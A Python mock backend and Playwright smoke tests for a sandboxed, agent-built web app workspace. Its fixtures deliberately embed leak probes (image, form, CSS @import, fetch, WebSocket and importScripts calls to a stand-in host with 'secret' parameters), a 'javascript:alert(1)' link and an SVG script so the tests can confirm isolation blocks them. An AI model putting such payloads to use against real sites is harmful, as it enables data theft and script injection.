"""Agentic Web App mock backend and browser security smoke checks."""

from __future__ import annotations

import copy
from datetime import datetime, timezone
from html import escape
from http import HTTPStatus
import json
import re
import threading
import time
from typing import Any, Callable
from urllib.parse import unquote

from host.runtime.workspace.web_apps import backend as builder_backend
from host.session_options import public_session_options


ApiErrorFactory = Callable[[HTTPStatus, str], Exception]
HostApi = Callable[[str, str, dict[str, list[str]], Any], dict[str, Any]]

AGENT_PROMPT = "Refresh the dashboard analysis from its current structured data."
LOAD_ONLY_PROMPT = "This load-only request must never start an agent task."
MOCK_TURN_SECONDS = 1.0
# The first turn is the only one the smoke inspects *while* it runs (the agent
# settings must be locked and the idle note shown). Those assertions are a
# handful of round trips against a UI that polls every 3s, so the window has to
# be comfortably wider than the poll rather than merely wider than a fast run.
MOCK_FIRST_TURN_SECONDS = 6.0
CONVERSATION_EVENTS_PAGE = builder_backend.CONVERSATION_EVENT_PAGE_LIMIT
INTERIM_AGENT_MESSAGE = "Drafting the app structure and checking its saved data."
LONG_MEDIA_CONDITION = " and ".join(["(min-width: 0px)"] * 40)
MOCK_LOCK = threading.RLock()
# One in-flight turn per workspace thread, completed when its deadline passes.
TURN_DEADLINES: dict[str, float] = {}
DEFAULT_SESSION = {
    "agent_runtime": "codex",
    "model": "gpt-5.6-terra",
    "effort": "high",
}
RUNTIME_LABELS = {
    "codex": "Codex",
    "claude_code": "Claude Code",
    "hermes": "Hermes",
}
DEMO_MODE = False


def configure_mock(*, demo_mode: bool) -> None:
    global DEMO_MODE
    DEMO_MODE = demo_mode


def _app_markup(count: int, title: str = "Weekly focus") -> str:
    return f"""
      <div class="sanitizer-probe containment-probe">
        <img src="https://browser-leak.invalid/image?secret=html">
        <a href="https://browser-leak.invalid/navigation?secret=anchor" id="copy-only-link">Leave the app</a>
        <a href="https://github.com/infiversehq/kern/pull/264" id="github-link">Open GitHub PR</a>
        <a href="https://www.instagram.com/reel/ABC123/" id="instagram-link">Open Instagram Reel</a>
        <a href="https://x.com/intent/tweet?in_reply_to=9001&amp;text=Prepared%20reply" id="x-reply-intent">Open reply in X</a>
        <a href="https://twitter.com/messages/compose?recipient_id=123456789&amp;text=Prepared%20DM" id="x-message-compose">Open message in X</a>
        <a href="javascript:alert(1)" id="invalid-scheme-link">Invalid scheme</a>
        <svg>
          <script>window.__foreignScriptRan = true</script>
          <foreignObject><img src="https://browser-leak.invalid/svg?secret=foreign"></foreignObject>
        </svg>
        <math><mtext><img src="https://browser-leak.invalid/math?secret=foreign"></mtext></math>
        <template><img src="https://browser-leak.invalid/template?secret=hidden"></template>
        <noscript><img src="https://browser-leak.invalid/noscript?secret=hidden"></noscript>
        <unknown-surface>
          <img src="https://browser-leak.invalid/unknown?secret=child">
          <span id="promoted-safe-child">Safe promoted child</span>
        </unknown-surface>
        <div id="semantic-probe">
          <abbr title="Estimated">Est.</abbr>
          <mark>Highlighted</mark>
          <ruby>信<rp>(</rp><rt>trust</rt><rp>)</rp></ruby>
          <label for="probe-priority">Priority</label>
          <input id="probe-priority" name="priority" list="priority-list" inputmode="text" pattern="[A-Za-z ]+">
          <datalist id="priority-list"><option value="Ship"></option></datalist>
        </div>
      </div>
      <form action="https://browser-leak.invalid/form?secret=form">
        <main class="dashboard">
          <p class="eyebrow">Personal dashboard</p>
          <h1>{escape(title)}</h1>
          <div class="metric"><strong data-count>{count}</strong><span>open priorities</span></div>
          <p class="analysis">No analysis yet.</p>
          <label><input type="checkbox" data-action="toggle-review"> Reviewed</label>
          <div class="dashboard-actions">
            <button data-action="increment">Add priority</button>
            <button data-action="refresh-analysis">Refresh analysis</button>
          </div>
          <label>Instruction <input id="enter-action" data-field="instruction" data-enter-action="submit-instruction"></label>
          <input id="bad-enter-action" data-enter-action="bad action">
          <div class="drag-probe">
            <button id="drag-source" data-drag-value="priority-ship">Drag Ship builder</button>
            <div id="drop-target" data-drop-action="move-priority" data-drop-value="priority-review">Drop before Review security</div>
            <button id="bad-drop-target" data-drop-action="bad action">Invalid drop target</button>
          </div>
        </main>
      </form>
    """


def _empty_app() -> dict[str, Any]:
    return {
        "revision": 0,
        "html": "",
        "css": "",
        "javascript": "",
        "data": {},
        "updated_at": "1970-01-01T00:00:00Z",
        "agent_updates_locked": False,
    }


def _built_app(title: str = "Weekly focus") -> dict[str, Any]:
    html = _app_markup(2, title)
    css = """
      @import url(https://browser-leak.invalid/style?secret=css);
      :h\\6fst { position:fixed!important; inset:0!important; z-index:2147483647!important; }
      .dashboard { display:grid; gap:1rem; max-width:48rem; margin:0 auto; padding:3rem 1.25rem; }
      .dashboard h1 { font-size:2rem; margin:0 0 .5rem; }
      .sanitizer-probe { display:none; }
      .containment-probe { position:fixed; inset:0; z-index:2147483647; }
      .containment-probe { background-image:url(https://browser-leak.invalid/background?secret=css); }
      .containment-probe { --escaped-image:u\\72l(https://browser-leak.invalid/escaped?secret=css); background-image:var(--escaped-image); }
      .eyebrow { color:#8b8b92; text-transform:uppercase; letter-spacing:.08em; }
      .metric { --panel-start:#11151d; background:linear-gradient(135deg,#11151d,#172033); color:var(--metric-text,#f4f7fb); display:flex; align-items:baseline; gap:.55rem; padding:1.25rem; border:1px solid #2e3644; border-radius:14px; }
      .metric strong { font-size:2.5rem; }
      #semantic-probe { filter:saturate(1); clip-path:inset(0 round 1px); text-shadow:0 1px 1px #000; }
      #semantic-probe::before { content:"Safe"; }
      .dashboard-actions { display:flex; flex-wrap:wrap; gap:.65rem; }
      .drag-probe { display:flex; flex-wrap:wrap; gap:.65rem; }
      [data-dragging] { opacity:.5; }
      [data-drag-over] { outline:2px solid #7c3aed; }
      button { background-color:#202838; border:1px solid #3d485c; color:#f4f7fb; cursor:pointer; width:max-content; padding:.65rem .9rem; border-radius:10px; }
      @supports (display: grid) { .supports-surface { color: red; } }
      @media __LONG_MEDIA_CONDITION__ { .too-long-media { color: red; } }
      @media (max-width: 640px) { .dashboard { padding: 2rem 1rem; } }
    """.replace("__LONG_MEDIA_CONDITION__", LONG_MEDIA_CONDITION)
    oversize_probe = "" if DEMO_MODE else f"""
        try {{
          app.render('x'.repeat({builder_backend.MAX_HTML_BYTES + 1}));
        }} catch (_error) {{
          app.notify('Oversized render rejected', 'success');
        }}
    """
    return {
        "revision": 1,
        "html": html,
        "css": css,
        "javascript": f"""
      try {{ fetch('https://browser-leak.invalid/fetch?secret=worker'); }} catch (_error) {{}}
      try {{ importScripts('https://browser-leak.invalid/import?secret=worker'); }} catch (_error) {{}}
      try {{ new WebSocket('wss://browser-leak.invalid/socket?secret=worker'); }} catch (_error) {{}}
      try {{ setTimeout(() => {{}}, 5); }} catch (_error) {{}}
      const initialMarkup = {json.dumps(html)};
      const initialCss = {json.dumps(css)};
      const renderDashboard = data => app.render(
        initialMarkup
          .replace('>2</strong>', `>${{data.count}}</strong>`)
          .replace('No analysis yet.', data.analysis || 'No analysis yet.'),
        initialCss,
      );
      app.onLoad(() => {{
        {oversize_probe}
        app.askAgent('{LOAD_ONLY_PROMPT}');
        renderDashboard(app.data());
      }});
      app.on('increment', async () => {{
        const next = await app.set(['count'], app.data().count + 1);
        renderDashboard(next);
      }});
      app.on('toggle-review', event => app.notify(event.checked ? 'Review marked complete' : 'Review reopened', 'success'));
      app.on('move-priority', event => app.notify(
        `Moved ${{event.draggedValue}} before ${{event.value}}`,
        'success',
      ));
      app.on('refresh-analysis', () => app.askAgent('{AGENT_PROMPT}'));
      app.on('submit-instruction', event => app.notify(
        `Submitted ${{event.fields.instruction}}`,
        'success',
      ));
    """,
        "data": {"count": 2, "priorities": ["Ship builder", "Review security"]},
        "updated_at": "2026-07-22T10:00:00Z",
    }


WORKSPACES: dict[str, dict[str, Any]] = {}


def reset_mock_state() -> None:
    with MOCK_LOCK:
        WORKSPACES.clear()
        TURN_DEADLINES.clear()


reset_mock_state()


def route_workspace_api(
    method: str,
    relative: str,
    query: dict[str, list[str]],
    body: Any,
    api_error: ApiErrorFactory,
    _host_api: HostApi,
) -> dict[str, Any]:
    try:
        return _route_workspace_api(method, relative, body, query)
    except builder_backend.WorkspaceError as exc:
        raise api_error(exc.status, exc.message) from exc


def _route_workspace_api(
    method: str,
    relative: str,
    body: Any,
    query: dict[str, list[str]] | None = None,
) -> dict[str, Any]:
    if method == "GET" and relative == "session-options":
        return {"session_options": public_session_options()}
    with MOCK_LOCK:
        _progress_turns()
        if method == "GET" and relative == "apps":
            return _list_apps(query or {})
        if method == "POST" and relative == "apps":
            return {"app": _create_app()}
        app_match = re.fullmatch(r"apps/([^/]+)/(.*)", relative)
        if not app_match:
            raise builder_backend.WorkspaceError(HTTPStatus.NOT_FOUND, "app not found")
        app_id = _path_segment(app_match.group(1))
        workspace = WORKSPACES.get(app_id)
        if workspace is None:
            raise builder_backend.WorkspaceError(HTTPStatus.NOT_FOUND, "app not found")
        resource = app_match.group(2)
        if method == "GET" and resource == "state":
            app = copy.deepcopy(workspace["app"])
            app["agent_updates_locked"] = bool(workspace["agent_updates_locked"])
            return {"app": app}
        if method == "GET" and resource == "conversation":
            return {
                "session": copy.deepcopy(workspace["session"]),
                "status": _workspace_status(workspace),
            }
        if method == "GET" and resource == "conversation/events":
            return _conversation_events(workspace, query or {})
        if method == "GET" and resource == "revisions":
            return _list_revisions(workspace)
        if method == "PUT" and resource == "name":
            return {"app": _rename_app(workspace, body)}
        if method == "PUT" and resource == "agent-updates":
            return {"app": _set_agent_updates_locked(workspace, body)}
        if method == "POST" and resource in {"archive", "unarchive"}:
            return {"app": _set_archived(workspace, resource == "archive")}
        if method == "POST" and resource == "stop":
            return _stop_turn(workspace)
        if method == "POST" and resource == "runtime/actions":
            return _runtime_action(workspace, body)
        if method == "POST" and resource == "messages":
            return _create_message(workspace, body)
        if method == "POST" and resource == "runtime/agent-requests":
            return _create_message(workspace, body)
        revision_match = re.fullmatch(
            r"revisions/([0-9]{1,18})/restore", resource
        )
        if method == "POST" and revision_match:
            return _restore_revision(workspace, int(revision_match.group(1)))
    raise builder_backend.WorkspaceError(HTTPStatus.NOT_FOUND, "route not found")


def _list_apps(query: dict[str, list[str]]) -> dict[str, Any]:
    unexpected = sorted(set(query) - {"archived"})
    if unexpected:
        raise builder_backend.WorkspaceError(
            HTTPStatus.BAD_REQUEST,
            f"unexpected app query fields: {', '.join(unexpected)}",
        )
    archived_values = query.get("archived") or []
    if len(archived_values) > 1 or (
        archived_values and archived_values[0] not in {"true", "false"}
    ):
        raise builder_backend.WorkspaceError(
            HTTPStatus.BAD_REQUEST, "archived must be true or false"
        )
    archived = bool(archived_values and archived_values[0] == "true")
    apps = [
        _app_summary(workspace)
        for workspace in WORKSPACES.values()
        if bool(workspace["archived"]) == archived
    ]
    apps.sort(key=lambda app: str(app["last_used_at"]), reverse=True)
    return {"apps": apps}


def _workspace_status(workspace: dict[str, Any]) -> str:
    return "running" if workspace["turn"] is not None else "idle"


def _app_summary(workspace: dict[str, Any]) -> dict[str, Any]:
    return {
        "app_id": workspace["app_id"],
        "name": workspace["name"],
        "revision": workspace["app"]["revision"],
        "created_at": workspace["created_at"],
        "updated_at": workspace["app"]["updated_at"],
        "last_used_at": max(workspace["app"]["updated_at"], workspace["last_used_at"]),
        "session": copy.deepcopy(workspace["session"]),
        "status": _workspace_status(workspace),
        "archived": bool(workspace["archived"]),
        "agent_updates_locked": bool(workspace["agent_updates_locked"]),
    }


def _create_app() -> dict[str, Any]:
    numbers = [
        int(match.group(1))
        for app_id in WORKSPACES
        if (match := builder_backend.APP_ID_RE.fullmatch(app_id))
        is not None
    ]
    app_id = f"app-{max(numbers, default=0) + 1}"
    now = _now()
    app = _empty_app()
    app["updated_at"] = now
    workspace = {
        "app_id": app_id,
        "name": app_id,
        "created_at": now,
        "last_used_at": now,
        "app": app,
        "turn": None,
        "events": [],
        "session": None,
        "archived": False,
        "agent_updates_locked": False,
        "history": [],
        "history_seq": 0,
    }
    WORKSPACES[app_id] = workspace
    _record_history(workspace, "created", "user")
    return _app_summary(workspace)


def _set_archived(workspace: dict[str, Any], archived: bool) -> dict[str, Any]:
    if archived and workspace["turn"] is not None:
        raise builder_backend.WorkspaceError(
            HTTPStatus.CONFLICT, "stop the agent before archiving this app"
        )
    workspace["archived"] = archived
    workspace["last_used_at"] = _now()
    return _app_summary(workspace)


def _set_agent_updates_locked(
    workspace: dict[str, Any], body: Any
) -> dict[str, Any]:
    request = builder_backend._required_object(body, "agent update lock request")
    builder_backend._require_keys(request, {"locked"}, required={"locked"})
    locked = request.get("locked")
    if not isinstance(locked, bool):
        raise builder_backend.WorkspaceError(
            HTTPStatus.BAD_REQUEST, "locked must be a boolean"
        )
    workspace["agent_updates_locked"] = locked
    return _app_summary(workspace)


def _rename_app(
    workspace: dict[str, Any], body: Any
) -> dict[str, Any]:
    request = builder_backend._required_object(body, "rename request")
    builder_backend._require_keys(request, {"name"}, required={"name"})
    name = builder_backend._required_text(request.get("name"), "name")
    if len(name) > builder_backend.MAX_APP_NAME_CHARS:
        raise builder_backend.WorkspaceError(
            HTTPStatus.BAD_REQUEST,
            f"name must be at most {builder_backend.MAX_APP_NAME_CHARS} characters",
        )
    workspace["name"] = name
    return _app_summary(workspace)


def _conversation_events(
    workspace: dict[str, Any], query: dict[str, list[str]]
) -> dict[str, Any]:
    unexpected = sorted(set(query) - {"since", "before", "activity"})
    if unexpected:
        raise builder_backend.WorkspaceError(
            HTTPStatus.BAD_REQUEST,
            f"unexpected conversation event query fields: {', '.join(unexpected)}",
        )
    since_values = query.get("since") or []
    before_values = query.get("before") or []
    activity_values = query.get("activity") or []
    if since_values and before_values:
        raise builder_backend.WorkspaceError(
            HTTPStatus.BAD_REQUEST, "since and before cannot be combined"
        )
    for name, values in (("since", since_values), ("before", before_values)):
        if len(values) > 1:
            raise builder_backend.WorkspaceError(
                HTTPStatus.BAD_REQUEST,
                f"{name} must be provided once",
            )
        if values and not values[0].isdigit():
            raise builder_backend.WorkspaceError(
                HTTPStatus.BAD_REQUEST,
                f"{name} must be a non-negative integer",
            )
    if len(activity_values) > 1 or (
        activity_values and activity_values[0] not in {"true", "false"}
    ):
        raise builder_backend.WorkspaceError(
            HTTPStatus.BAD_REQUEST, "activity must be true or false"
        )
    include_activity = not activity_values or activity_values[0] == "true"
    eligible_events = [
        event
        for event in workspace["events"]
        if include_activity or event["event_type"] != "thread.activity"
    ]
    if since_values:
        since = int(since_values[0])
        page = [
            event for event in eligible_events if event["seq"] > since
        ][:CONVERSATION_EVENTS_PAGE]
    else:
        before = int(before_values[0]) if before_values else None
        eligible = [
            event
            for event in eligible_events
            if before is None or event["seq"] < before
        ]
        page = eligible[-CONVERSATION_EVENTS_PAGE:]
    events = copy.deepcopy(page)
    for event in events:
        payload = event.get("payload")
        if isinstance(payload, dict) and isinstance(payload.get("message"), str):
            payload["message"] = _clip_message(payload["message"])
    return {"events": events}


def _clip_message(value: str) -> str:
    maximum = builder_backend.CONVERSATION_MESSAGE_BYTES
    encoded = value.encode()
    if len(encoded) <= maximum:
        return value
    suffix = "…".encode()
    return encoded[: maximum - len(suffix)].decode(errors="ignore") + "…"


# --- History -----------------------------------------------------------------


def _record_history(
    workspace: dict[str, Any], kind: str, actor: str, _entry: dict[str, Any] | None = None
) -> None:
    workspace["history_seq"] += 1
    app = workspace["app"]
    workspace["history"].append(
        {
            "id": workspace["history_seq"],
            "kind": kind,
            "actor": actor,
            "revision": app["revision"],
            "html": app["html"],
            "css": app["css"],
            "javascript": app["javascript"],
            "data": copy.deepcopy(app["data"]),
            "created_at": _now(),
        }
    )


def _list_revisions(workspace: dict[str, Any]) -> dict[str, Any]:
    return {
        "revisions": [
            {
                "revision": entry["revision"],
                "kind": entry["kind"],
                "actor": entry["actor"],
                "restored_from": entry.get("restored_from"),
                "created_at": entry["created_at"],
            }
            for entry in reversed(workspace["history"])
        ]
    }


def _restore_revision(workspace: dict[str, Any], revision: int) -> dict[str, Any]:
    entry = next(
        (candidate for candidate in workspace["history"] if candidate["revision"] == revision),
        None,
    )
    if entry is None:
        raise builder_backend.WorkspaceError(HTTPStatus.NOT_FOUND, "revision not found")
    app = workspace["app"]
    app.update({
        "html": entry["html"],
        "css": entry["css"],
        "javascript": entry["javascript"],
        "data": copy.deepcopy(entry["data"]),
        "revision": app["revision"] + 1,
        "updated_at": _now(),
    })
    _record_history(workspace, "restore", "user")
    workspace["history"][-1]["restored_from"] = revision
    return {"ok": True, "app": copy.deepcopy(app)}


# --- Data actions and messages -----------------------------------------------


def _runtime_action(
    workspace: dict[str, Any], body: Any
) -> dict[str, Any]:
    action = builder_backend._required_object(body, "runtime action")
    name = builder_backend._required_text(action.get("action"), "action")
    allowed = {"action", "expected_revision", "path"}
    required = {"action", "expected_revision", "path"}
    if name in {"set", "append"}:
        allowed.add("value")
        required.add("value")
    builder_backend._require_keys(action, allowed, required=required)
    if name not in {"set", "delete", "append"}:
        raise builder_backend.WorkspaceError(HTTPStatus.UNPROCESSABLE_ENTITY, "unsupported data action")
    version = builder_backend._required_counter(
        action.get("expected_revision"), "expected_revision"
    )
    app = workspace["app"]
    if version != app["revision"]:
        raise builder_backend.WorkspaceError(HTTPStatus.CONFLICT, "app data changed; reload and retry")
    path = builder_backend._validated_path(action.get("path"))
    updated = builder_backend._mutate_data(
        copy.deepcopy(app["data"]), name, path, action.get("value")
    )
    builder_backend._validated_data(updated)
    app["data"] = updated
    app["revision"] = version + 1
    app["updated_at"] = _now()
    entry: dict[str, Any] = {"action": name, "path": path}
    if name != "delete":
        entry["value"] = action.get("value")
    _record_history(workspace, "data", "app", entry)
    return {
        "app": {
            "revision": app["revision"],
            "data": copy.deepcopy(updated),
            "updated_at": app["updated_at"],
        }
    }


def _create_message(
    workspace: dict[str, Any],
    body: Any,
) -> dict[str, Any]:
    request = builder_backend._required_object(body, "message request")
    config_fields = ("agent_runtime", "model", "effort")
    builder_backend._require_keys(
        request,
        {"content", *config_fields},
        required={"content"},
    )
    content = builder_backend._bounded_required_text(
        request.get("content"),
        "content",
        builder_backend.MAX_CHAT_MESSAGE_BYTES,
    )
    input_message = content
    supplied = [field for field in config_fields if field in request]
    if supplied and len(supplied) != len(config_fields):
        raise builder_backend.WorkspaceError(
            HTTPStatus.BAD_REQUEST,
            "agent_runtime, model, and effort must be provided together",
        )
    requested: dict[str, str] | None = None
    if supplied:
        runtime = builder_backend._required_text(request.get("agent_runtime"), "agent_runtime")
        model = request.get("model")
        effort = request.get("effort")
        error = builder_backend.session_config_error(runtime, model, effort)
        if error is not None:
            raise builder_backend.WorkspaceError(HTTPStatus.BAD_REQUEST, error)
        assert isinstance(model, str) and isinstance(effort, str)
        requested = {"agent_runtime": runtime, "model": model, "effort": effort}
    session = workspace["session"]
    if session is not None:
        if requested is not None and requested != session:
            if workspace["turn"] is not None:
                raise builder_backend.WorkspaceError(
                    HTTPStatus.CONFLICT,
                    "thread runtime, model, and effort can change only while the thread is idle",
                )
            previous = session
            workspace["session"] = requested
            _append_turn_event(
                workspace,
                "thread.activity",
                {
                    "activity": {
                        "provider": "kern",
                        "activity_id": "session-change",
                        "kind": "status",
                        "status": "completed",
                        "title": (
                            "Agent provider changed"
                            if previous["agent_runtime"] != requested["agent_runtime"]
                            else "Agent session changed"
                        ),
                        "detail": (
                            f"{RUNTIME_LABELS[previous['agent_runtime']]} · "
                            f"{previous['model']} · {previous['effort']} → "
                            f"{RUNTIME_LABELS[requested['agent_runtime']]} · "
                            f"{requested['model']} · {requested['effort']}"
                        ),
                        "output": None,
                    }
                },
            )
    else:
        if requested is None:
            raise builder_backend.WorkspaceError(
                HTTPStatus.BAD_REQUEST,
                "agent_runtime, model, and effort are required for the first message",
            )
        workspace["session"] = requested
    workspace["last_used_at"] = _now()
    turn = workspace["turn"]
    if turn is not None:
        # No queue: a message on a busy thread steers its running turn.
        turn["input_message"] = input_message
        _append_turn_event(
            workspace, "thread.message", {"message": input_message, "source": "user"}
        )
        return {"status": "accepted", "app_id": workspace["app_id"]}
    workspace["turn"] = {"input_message": input_message}
    has_bundle = any(
        workspace["app"].get(field)
        for field in ("html", "css", "javascript")
    )
    turn_seconds = MOCK_TURN_SECONDS if has_bundle else MOCK_FIRST_TURN_SECONDS
    TURN_DEADLINES[workspace["app_id"]] = time.monotonic() + turn_seconds
    _append_turn_event(
        workspace, "thread.message", {"message": input_message, "source": "user"}
    )
    activity_id = f"mock-turn-{len(workspace['events'])}"
    for activity in (
        {
            "provider": "kern",
            "activity_id": activity_id,
            "kind": "command",
            "phase": "started",
            "status": "running",
            "title": "Inspecting app workspace",
            "detail": "Read the current app files and structured data.",
            "output": "Reading files.",
        },
        {
            "provider": "kern",
            "activity_id": activity_id,
            "kind": "command",
            "phase": "started",
            "status": "running",
            "title": "Command output",
            "output": " Structured data loaded.",
            "append_output": True,
        },
        {
            "provider": "kern",
            "activity_id": activity_id,
            "kind": "command",
            "phase": "completed",
            "status": "exit 0",
            "title": "Command output",
        },
    ):
        _append_turn_event(workspace, "thread.activity", {"activity": activity})
    _append_turn_event(
        workspace, "thread.message", {"message": INTERIM_AGENT_MESSAGE, "source": "agent"}
    )
    return {"status": "accepted", "app_id": workspace["app_id"]}


def _stop_turn(workspace: dict[str, Any]) -> dict[str, Any]:
    if workspace["turn"] is None:
        raise builder_backend.WorkspaceError(
            HTTPStatus.CONFLICT, "the thread has no running work"
        )
    TURN_DEADLINES.pop(workspace["app_id"], None)
    workspace["turn"] = None
    workspace["last_used_at"] = _now()
    _append_turn_event(workspace, "thread.stopped", {})
    return {"status": "accepted"}


def _progress_turns() -> None:
    now_monotonic = time.monotonic()
    for workspace in WORKSPACES.values():
        turn = workspace["turn"]
        deadline = TURN_DEADLINES.get(workspace["app_id"])
        if turn is None or deadline is None or now_monotonic < deadline:
            continue
        app = workspace["app"]
        now = _now()
        has_bundle = bool(app["html"] or app["css"] or app["javascript"])
        agent_analysis_turn = turn["input_message"] == AGENT_PROMPT
        output_message = (
            "Built the dashboard with durable priorities and interactive controls."
            if not has_bundle
            else (
                "Reviewed the current structured data and refreshed the dashboard analysis."
                if agent_analysis_turn
                else "Updated the web app from this request."
            )
        )
        _append_turn_event(
            workspace, "thread.message", {"message": output_message, "source": "agent"}
        )
        TURN_DEADLINES.pop(workspace["app_id"], None)
        workspace["turn"] = None
        workspace["last_used_at"] = now
        if not has_bundle:
            title = (
                "Weekly focus"
                if builder_backend.APP_ID_RE.fullmatch(
                    workspace["name"]
                )
                else workspace["name"]
            )
            built = _built_app(title)
            built["updated_at"] = now
            workspace["app"] = built
            _record_history(workspace, "ui", "agent")
        elif agent_analysis_turn:
            app["data"] = {
                **app["data"],
                "analysis": "Two priorities remain open; review the security item before shipping.",
            }
            app["revision"] += 1
            app["updated_at"] = now
            _record_history(
                workspace, "data", "agent",
                {"action": "set", "path": ["analysis"], "value": app["data"]["analysis"]},
            )


def _append_turn_event(
    workspace: dict[str, Any],
    event_type: str,
    payload: dict[str, Any],
) -> None:
    events = workspace["events"]
    seq = events[-1]["seq"] + 1 if events else 1
    events.append(
        {
            "seq": seq,
            "timestamp": _now(),
            "event_id": f"event_{workspace['app_id']}_{seq}",
            "event_type": event_type,
            # Conversation events are host thread events. The Web App happens
            # to use the same immutable value as its thread id, but the wire
            # event schema remains the admin API's `thread_id` schema.
            "thread_id": workspace["app_id"],
            "payload": payload,
        }
    )


def _path_segment(value: str) -> str:
    decoded = unquote(value)
    if not decoded or "/" in decoded or "\\" in decoded:
        raise builder_backend.WorkspaceError(
            HTTPStatus.BAD_REQUEST,
            "invalid path segment",
        )
    return decoded


def _now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z")


def _open_mobile_host_navigation(page: Any) -> None:
    from playwright.sync_api import expect

    toggle = page.locator("#mobile-nav-toggle")
    if not toggle.is_visible():
        return
    # Let the host's initial Workspace mount finish before opening the drawer;
    # its route completion also closes a previously open mobile drawer.
    page.wait_for_timeout(250)
    toggle.click()
    sidebar = page.locator("#sidebar")
    expect(sidebar).to_have_class(re.compile(r"mobile-open"))
    expect(sidebar).to_have_css("transform", "matrix(1, 0, 0, 1, 0, 0)")


def _open_host_app(page: Any, name: str) -> None:
    from playwright.sync_api import expect

    _open_mobile_host_navigation(page)
    app = page.locator("#web-apps-nav-items .workspace-nav-item", has_text=name)
    expect(app).to_be_visible()
    app.click()
    expect(page.locator("#panel-workspace-web-apps")).to_be_visible()


def _start_host_app(page: Any) -> None:
    from playwright.sync_api import expect

    _open_mobile_host_navigation(page)
    page.get_by_role("button", name="New app", exact=True).click()
    expect(page.locator("#panel-workspace-web-apps")).to_be_visible()


def stylesheet_fallback_smoke(page: Any) -> None:
    """The App still renders when constructable sheets cannot be adopted.

    This models browsers that expose CSSStyleSheet (needed by the sanitizer)
    but reject ShadowRoot.adoptedStyleSheets, the compatibility boundary that
    previously left dynamic Apps stuck on their stored Loading placeholder.
    """
    from playwright.sync_api import expect

    page.evaluate("""
      Object.defineProperty(ShadowRoot.prototype, "adoptedStyleSheets", {
        configurable: true,
        get() { return []; },
        set() { throw new DOMException("unsupported", "NotSupportedError"); },
      });
    """)
    _start_host_app(page)
    frame = page.locator("#panel-workspace-web-apps")
    frame.locator("#message").fill("Build a small weekly focus dashboard.")
    frame.get_by_role("button", name="Send message", exact=True).click()
    expect(frame.locator(".dashboard")).to_be_visible(timeout=20_000)
    expect(frame.locator(".dashboard")).to_have_css("display", "grid")
    stylesheet = frame.locator("#generated-host").evaluate(
        "element => element.shadowRoot.querySelector('link[rel=stylesheet]')?.href || ''"
    )
    if not stylesheet.startswith("blob:"):
        raise AssertionError(f"generated app did not use its blob stylesheet fallback: {stylesheet!r}")


def worker_startup_smoke(page: Any) -> None:
    """A real generated App starts through the isolated worker bridge."""
    from playwright.sync_api import expect

    leaked: list[str] = []
    page.on(
        "request",
        lambda request: leaked.append(request.url)
        if "browser-leak.invalid" in request.url else None,
    )
    page.evaluate("""() => {
      globalThis.__kernCapabilityRenderCount = 0;
      const NativeWorker = globalThis.Worker;
      globalThis.Worker = function(...args) {
        const worker = new NativeWorker(...args);
        if (String(args[0]).endsWith("/workspace/capability-worker-sandbox.js")) {
          worker.addEventListener("message", event => {
            const message = event.data;
            if (
              message?.type === "capability-worker-message"
              && message.data?.type === "render"
            ) globalThis.__kernCapabilityRenderCount += 1;
          });
        }
        return worker;
      };
      globalThis.Worker.prototype = NativeWorker.prototype;
      Object.setPrototypeOf(globalThis.Worker, NativeWorker);
    }""")
    _start_host_app(page)
    frame = page.locator("#panel-workspace-web-apps")
    frame.locator("#message").fill("Build a small weekly focus dashboard.")
    frame.get_by_role("button", name="Send message", exact=True).click()
    page.wait_for_function(
        "() => globalThis.__kernCapabilityRenderCount > 0", timeout=20_000
    )
    expect(frame.locator(".dashboard")).to_be_visible(timeout=20_000)
    expect(frame.locator(".dashboard")).to_have_css("display", "grid")
    expect(frame.locator("#runtime-status")).not_to_contain_text(
        "could not start", timeout=5_000
    )
    if leaked:
        raise AssertionError(f"generated worker escaped its networkless CSP: {leaked}")


def desktop_smoke(page: Any) -> None:
    from playwright.sync_api import expect

    leaked: list[str] = []
    page.on(
        "request",
        lambda request: leaked.append(request.url)
        if "browser-leak.invalid" in request.url else None,
    )
    existing_app_count = page.locator("#web-apps-nav-items .workspace-nav-item").count()
    page.evaluate(
        """() => {
          const nativeApi = window.KernHost.api;
          window.KernHost.api = (method, path, body) => {
            if (method !== "POST" || path !== "/v1/workspace/web-apps/apps") {
              return nativeApi(method, path, body);
            }
            return new Promise((resolve, reject) => {
              window.__releaseSlowAppCreate = () => {
                window.KernHost.api = nativeApi;
                return nativeApi(method, path, body).then(resolve, reject);
              };
            });
          };
        }"""
    )
    _start_host_app(page)
    expect(page).to_have_url(re.compile(r"#apps$"))
    page.wait_for_function("() => typeof window.__releaseSlowAppCreate === 'function'")
    page.get_by_role("button", name="Home", exact=True).click()
    page.evaluate("window.__releaseSlowAppCreate()")
    expect(page.locator("#web-apps-nav-items .workspace-nav-item")).to_have_count(
        existing_app_count + 1
    )
    expect(page.locator("#panel-home")).to_be_visible()
    expect(page).to_have_url(re.compile(r"#home$"))
    _start_host_app(page)
    frame = page.locator("#panel-workspace-web-apps")
    expect(frame.locator("#app-view")).to_be_visible()
    expect(frame.locator("#admin-overlay")).to_have_count(0)
    expect(frame.locator("#message")).to_be_visible()
    expect(frame.locator("#app-title")).to_have_text(re.compile(r"^app-[0-9]+$"))
    first_app = frame.locator("#app-title").inner_text().strip()
    expect(page).to_have_url(re.compile(rf"#apps/{re.escape(first_app)}$"))
    page.reload(wait_until="domcontentloaded")
    expect(page.locator("#panel-workspace-web-apps")).to_be_visible()
    expect(frame.locator("#app-title")).to_have_text(first_app)
    expect(page).to_have_url(re.compile(rf"#apps/{re.escape(first_app)}$"))
    page.evaluate(
        """appId => window.KernHost.api(
          "POST",
          `/v1/workspace/web-apps/apps/${encodeURIComponent(appId)}/archive`,
          {},
        )""",
        first_app,
    )
    page.evaluate("window.KernWebApps.refresh()")
    expect(frame.locator("#empty-title")).to_have_text("Choose an app")
    expect(page).to_have_url(re.compile(r"#apps$"))
    page.evaluate(
        """appId => window.KernHost.api(
          "POST",
          `/v1/workspace/web-apps/apps/${encodeURIComponent(appId)}/unarchive`,
          {},
        )""",
        first_app,
    )
    page.evaluate("window.KernHost.refreshNavigation()")
    _open_host_app(page, first_app)
    expect(page).to_have_url(re.compile(rf"#apps/{re.escape(first_app)}$"))
    # Active sidebar rows are direct navigation only; lifecycle actions live
    # in the selected resource toolbar.
    expect(page.locator("#web-apps-nav-items .workspace-nav-row-action")).to_have_count(0)
    expect(page.locator("#chat-nav-items .workspace-nav-row-action")).to_have_count(0)
    expect(frame.get_by_role("button", name="Archive app", exact=True)).to_be_visible()

    frame.locator("#settings-open").click()
